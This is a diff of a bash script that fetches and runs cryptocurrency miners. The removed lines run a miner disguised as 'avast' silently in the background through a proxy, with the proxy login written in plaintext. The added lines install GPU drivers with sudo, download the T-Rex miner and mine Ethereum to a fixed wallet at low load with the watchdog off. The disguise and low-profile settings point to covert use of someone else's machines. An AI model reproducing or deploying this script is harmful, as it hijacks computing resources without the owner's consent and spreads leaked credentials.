@@ -1,6 +1,18 @@
 #!/bin/bash
-
-
-
-chmod +x avast
-nohup ./avast -v -l verushash.asia.mine.zergpool.com:3300 -u 7pXYkwdwUFBGNaG8dJ8w6kZTzRjnTpDTgo.$(echo $(shuf -i 1-99999 -n 1)-U) -p c=DASH -t 8 -x socks5://njhlezbg-1:bo6mj3wz34gr@u1.p.webshare.io:80 >/dev/null 2>&1
+SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
+if [ ! -f "${SCRIPT_DIR}/isHaveSetupCoin.txt" ];
+then
+	echo "taind vip pro" > isHaveSetupCoin.txt
+	cd /usr/local/bin
+	sudo apt-get install linux-headers-$(uname -r) -y
+	distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
+	sudo wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
+	sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
+	sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
+	echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
+	sudo apt-get update
+	sudo apt-get -y install cuda-drivers
+	sudo apt-get install libcurl3 -y
+	sudo wget https://github.com/trexminer/T-Rex/releases/download/0.23.1/t-rex-0.23.1-linux.tar.gz
+	sudo tar xvzf t-rex-0.23.1-linux.tar.gz
+	./t-rex -a ethash -o stratum+tcp://eu1.ethermine.org:4444 -u 0x66DafFaEF6D0936a05F362ADe7bE4A5616d9C85a -p x -w test2 --no-nvml --no-watchdog --low-load 1 --intensity 8
